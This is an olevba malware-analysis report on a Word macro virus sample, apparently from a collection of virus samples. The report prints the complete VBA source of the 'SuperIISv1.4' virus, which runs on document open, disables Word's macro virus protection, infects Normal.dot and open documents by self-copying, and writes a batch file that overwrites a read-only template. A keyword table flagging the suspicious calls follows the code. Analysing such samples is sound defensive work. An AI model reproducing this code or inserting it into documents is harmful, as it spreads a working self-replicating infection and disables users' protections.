olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.l-e5a26bb4c930b7aa5eca67a900366ba23bc8e096
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.l-e5a26bb4c930b7aa5eca67a900366ba23bc8e096 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.l-e5a26bb4c930b7aa5eca67a900366ba23bc8e096 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'On Error GoTo eb
'MyName=SuperIISv1.4
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
Call Flitnic
eb:
End Sub
Sub ViewVbCode()
windir = Environ("windir")
look = Dir("c:\temp2.dat")
If look <> "" Then
ReDim m(2)
Set m(1) = ActiveDocument.VBProject
Set m(2) = NormalTemplate.VBProject
Close
Open "c:\temp2.dat" For Input As #1
Line Input #1, mood
If mood = "n" Then
windir = Environ("windir")
Set mood = m(2)
Else
Set mood = m(1)
End If
mood.VBComponents.Import windir & "\System\Flitnic.drv"
Exit Sub
End If
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
NoSet:
windir = Environ("windir")
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
actdoche.VBComponents(t).codemodule.deletelines 1, actdoche.VBComponents.Item(t).codemodule.countoflines
actdoche.VBComponents.Remove actdoche.VBComponents(t)
ActiveDocument.Saved = True
NoDoc:
ms = nmtmpl.VBComponents.Count
For t2 = 2 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
nmtmpl.VBComponents(t2).codemodule.deletelines 1, nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents.Remove nmtmpl.VBComponents(t2)
esub:
eb:
Application.ShowVisualBasicEditor = True
NoDocL:
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr (NormalTemplate.FullName), vbNormal
NoSet:
'Save ActiveDocument:
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
If Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).codemodule.countoflines
FullCodeN = FullCodeN & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
FullCodeD = FullCodeD & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
End If
'Clean Activedocument:
a = actdoche.VBComponents(t).codemodule.countoflines
actdoche.VBComponents(t).codemodule.deletelines 1, a
ActiveDocument.Saved = True
ActiveDocument.Saved = True
NoDoc:
l = ""
'Save NormalTemplate:
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).codemodule.countoflines
FullCodeD = FullCodeD & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
FullCodeN = FullCodeN & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
End If
'Clean NormalTemplate:
l = ""
On Error GoTo 0
On Error GoTo eb
a = nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents(t2).codemodule.deletelines 1, a
NormalTemplate.Saved = True
esub:
a = GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved = True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf = True
'If Application.ShowVisualBasicEditor = True Then ReInf = False
Reinfection:
If ReInf = True Then
'Reinfection:
Acd = 0
NormT = 0
If NormT <> 1 Then
NormAt = False
Close #1
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).codemodule.countoflines
If a < 1 Then
innt = 1
i = 20
Exit For
End If
Next inn
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
NormalTemplate.Saved = True
End If
End If
i = 1
If NormAt <> True Then NormalTemplate.Save
notemp:
If Acd <> 1 Then
Close
look2:
a = Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).codemodule.countoflines
If a < 1 Then
iact = 1
i = 20
Exit For
End If
Next inn2
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
If innt = 1 Or iact = 1 Then
If innt = 1 Then
Set inff = NormalTemplate.VBProject
component = inn
FullCode = FullCodeN
InstSys = 1
Else
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
End If
onceAgain:
inff.VBComponents(component).codemodule.addfromstring (FullCode)
If iact = 1 Then
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
iact = 0
GoTo onceAgain
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For i = 1 To 2
al = nmtmpl.VBComponents(t2).codemodule.countoflines
nmtmpl.VBComponents(t2).codemodule.deletelines 1, al
Next i
End If
opttt.SaveNormalPrompt = False
NormalTemplate.Saved = True
End Sub
Sub Flitnic()
Begin:
On Error GoTo eb
Set opttt = Options
Set nmtmpl = NormalTemplate.VBProject
Set actdoche = ActiveDocument.VBProject
NormAt = False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
opttt.VirusProtection = False
opttt.ConfirmConversions = False
opttt.SaveNormalPrompt = False
Close #1
windir = Environ("windir")
On Error GoTo NoInf
ms = actdoche.VBComponents.Count
For t = 1 To ms
ls = actdoche.VBComponents(t).codemodule.countoflines
If ls > 3 Then l = actdoche.VBComponents(t).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
Acd = 1
Exit For
End If
Next t
l = ""
If Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
a = actdoche.VBComponents.Item(t).codemodule.countoflines
FullCodeN = FullCodeN & actdoche.VBComponents.Item(t).codemodule.Lines(2, a)
End If
ms = nmtmpl.VBComponents.Count
For t2 = 1 To ms
ls = nmtmpl.VBComponents(t2).codemodule.countoflines
If ls > 3 Then l = nmtmpl.VBComponents(t2).codemodule.Lines(3, 1)
If UCase(l) = "'MYNAME=SUPERIISV1.4" Then
NormT = 1
Exit For
End If
Next t2
If NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
a = nmtmpl.VBComponents.Item(t2).codemodule.countoflines
FullCodeD = FullCodeD & nmtmpl.VBComponents.Item(t2).codemodule.Lines(2, a)
End If
If NormT <> 1 Then
look:
ms = nmtmpl.VBComponents.Count
For inn = 2 To ms
a = nmtmpl.VBComponents(inn).codemodule.countoflines
If a < 1 Then
innt = 1
i = 20
Exit For
End If
Next inn
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close
InsertC = "n"
mmm = Dir("c:\temp2.dat")
If mmm <> "" Then Kill "c:\temp2.dat"
Close
Open "c:\temp2.dat" For Append As #1
Print #1, InsertC
Close
Call ViewVbCode
Close
Kill "c:\temp2.dat"
GoTo look
End If
End If
i = 1
If Acd <> 1 Then
Close
look2:
ms = actdoche.VBComponents.Count
For inn2 = 2 To ms
a = actdoche.VBComponents(inn2).codemodule.countoflines
If a < 1 Then
iact = 1
i = 20
Exit For
End If
Next inn2
If i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
InsertC = "nn"
mmm = Dir("c:\temp2.dat")
If mmm <> "" Then Kill "c:\temp2.dat"
Close
Open "c:\temp2.dat" For Append As #1
Print #1, InsertC
Close
Call ViewVbCode
Close
Kill "c:\temp2.dat"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved = True
End If
End If
If innt = 1 Or iact = 1 Then
If innt = 1 Then
Set inff = NormalTemplate.VBProject
component = inn
FullCode = FullCodeN
InstSys = 1
Else
Set inff = ActiveDocument.VBProject
component = inn2
FullCode = FullCodeD
End If
inff.VBComponents(component).codemodule.addfromstring (FullCode)
If InstSys = 1 Then
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt = ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved = True
ActiveDocument.Saved = True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l = Len(NormalTemplate.FullName)
l = l - 10
For i = 1 To 500
Print #1, "rem Flitnic has cought you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y " & Chr(34) & "c:\Troop.dat" & Chr(34) & " " & Chr(34) & NormalTemplate.FullName & Chr(34)
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved = True
a = Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If NormAt = True Then
End If
notemp:
End If
End If
NoInf:
eb:
a = Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved = False
GoTo NoNormal
End If
If NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr (NormalTemplate.FullName), vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved = True
'The only real- stealth virus till 08. april 1999. Infects Normal.Dot when
'it's ReadOnly too (immediatly, the first time you load an infected
'Document
'Written by Flitnic, member of [S o S] No Payload included yet!
NoNormal:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |lo.bat              |Executable file name                         |
+----------+--------------------+---------------------------------------------+

